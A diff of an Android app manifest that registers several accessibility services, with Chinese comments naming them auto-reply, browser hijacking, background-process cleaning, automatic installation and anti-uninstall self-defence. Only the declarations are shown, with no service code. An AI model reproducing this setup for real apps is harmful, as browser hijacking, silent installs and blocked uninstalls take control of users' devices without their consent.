@@ -20,23 +20,69 @@
 
         <activity android:name=".AutoActivity" ></activity>
 
+        <!--注册自动回复服务-->
         <service
-            android:name=".AutoReplyAccessibilityService"
+            android:name=".service.AutoReplyAccessibilityService"
             android:enabled="true"
             android:exported="true"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService"/>
             </intent-filter>
-
             <meta-data
                 android:name="android.accessibilityservice"
                 android:resource="@xml/reply"/>
         </service>
+
+        <!--注册劫持浏览器-->
+        <service
+            android:name=".service.SearchHackAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility"/>
+        </service>
+
+        <!--注册清理后台进程服务-->
+        <service
+            android:name=".service.CleanBackgroundProcessAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/clean"/>
+        </service>
+
+        <!--注册自动安装服务-->
+        <service
+            android:name=".service.AutoInstallAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/install"/>
+        </service>
+
+        <!--注册防卸载服务-->
+        <service
+            android:name=".service.SelfDefenseAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/defense"/>
+        </service>
     </application>
 
     <uses-permission android:name="android.permission.INTERACT_ACROSS_USERS_FULL" />
-
-
 
 </manifest>
